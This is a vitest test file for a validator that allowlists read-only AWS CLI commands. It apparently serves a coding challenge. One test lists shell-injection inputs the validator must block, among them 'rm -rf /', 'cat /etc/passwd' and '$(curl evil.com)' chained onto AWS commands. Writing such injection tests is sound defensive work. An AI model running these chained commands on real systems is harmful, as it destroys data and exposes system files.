import { describe, it, expect } from 'vitest';
import { validateCommand, normalizeCommand, toArgv, RISK } from './commandValidator.js';

/**
 * These tests map directly to the 12 required test scenarios in the challenge spec.
 * The validator is the security backbone, so it is tested exhaustively.
 */
describe('commandValidator — required test scenarios', () => {
  // 1. Valid S3 request
  it('1. allows a valid read-only S3 command', () => {
    const r = validateCommand('aws s3 ls');
    expect(r.allowed).toBe(true);
    expect(r.risk).toBe(RISK.READ_ONLY);
  });

  // 2. Valid STS request
  it('2. allows a valid STS get-caller-identity command', () => {
    const r = validateCommand('aws sts get-caller-identity');
    expect(r.allowed).toBe(true);
    expect(r.risk).toBe(RISK.READ_ONLY);
  });

  // 3. Valid EC2 read-only request
  it('3. allows a valid EC2 describe-instances command', () => {
    const r = validateCommand('aws ec2 describe-instances');
    expect(r.allowed).toBe(true);
  });

  // 4. Valid Lambda read-only request
  it('4. allows a valid Lambda list-functions command', () => {
    const r = validateCommand('aws lambda list-functions');
    expect(r.allowed).toBe(true);
  });

  // 5. Valid DynamoDB read-only request
  it('5. allows a valid DynamoDB list-tables command', () => {
    const r = validateCommand('aws dynamodb list-tables');
    expect(r.allowed).toBe(true);
  });

  // 6. Invalid/unsupported command (valid aws command but not on allowlist)
  it('6. rejects a well-formed AWS command that is not on the allowlist', () => {
    const r = validateCommand('aws s3api get-object --bucket x --key y out.txt');
    expect(r.allowed).toBe(false);
    expect(r.reason).toMatch(/allowlist|mutating|destructive/i);
  });

  // 7. Dangerous command (destructive verb)
  it('7. rejects a destructive command (s3 rb / delete)', () => {
    const rb = validateCommand('aws s3 rb s3://my-bucket --force');
    expect(rb.allowed).toBe(false);
    expect(rb.risk).toBe(RISK.HIGH);

    const del = validateCommand('aws ec2 terminate-instances --instance-ids i-123');
    expect(del.allowed).toBe(false);
  });

  // 8. Shell injection attempt
  it('8. rejects shell injection / command chaining attempts', () => {
    const cases = [
      'aws s3 ls && rm -rf /',
      'aws s3 ls; cat /etc/passwd',
      'aws s3 ls | grep secret',
      'aws s3 ls > out.txt',
      'aws sts get-caller-identity `whoami`',
      'aws s3 ls $(curl evil.com)',
      'aws s3 ls || echo pwned',
    ];
    for (const c of cases) {
      const r = validateCommand(c);
      expect(r.allowed, `expected blocked: ${c}`).toBe(false);
      expect(r.risk).toBe(RISK.BLOCKED);
    }
  });

  // 11. Empty user request
  it('11. rejects an empty command', () => {
    expect(validateCommand('').allowed).toBe(false);
    expect(validateCommand('   ').allowed).toBe(false);
    expect(validateCommand(null).allowed).toBe(false);
    expect(validateCommand(undefined).allowed).toBe(false);
  });

  // Non-aws command
  it('rejects any command that does not start with aws', () => {
    expect(validateCommand('ls -la').allowed).toBe(false);
    expect(validateCommand('kubectl get pods').allowed).toBe(false);
    expect(validateCommand('awsfoo bar').allowed).toBe(false);
  });
});

describe('normalizeCommand', () => {
  it('trims and collapses whitespace', () => {
    expect(normalizeCommand('  aws   s3    ls  ')).toBe('aws s3 ls');
  });
  it('handles non-strings', () => {
    expect(normalizeCommand(null)).toBe('');
    expect(normalizeCommand(42)).toBe('');
  });
});

describe('toArgv', () => {
  it('drops the leading aws token', () => {
    expect(toArgv('aws sts get-caller-identity')).toEqual(['sts', 'get-caller-identity']);
  });
  it('normalizes before splitting', () => {
    expect(toArgv('  aws   s3   ls ')).toEqual(['s3', 'ls']);
  });
});
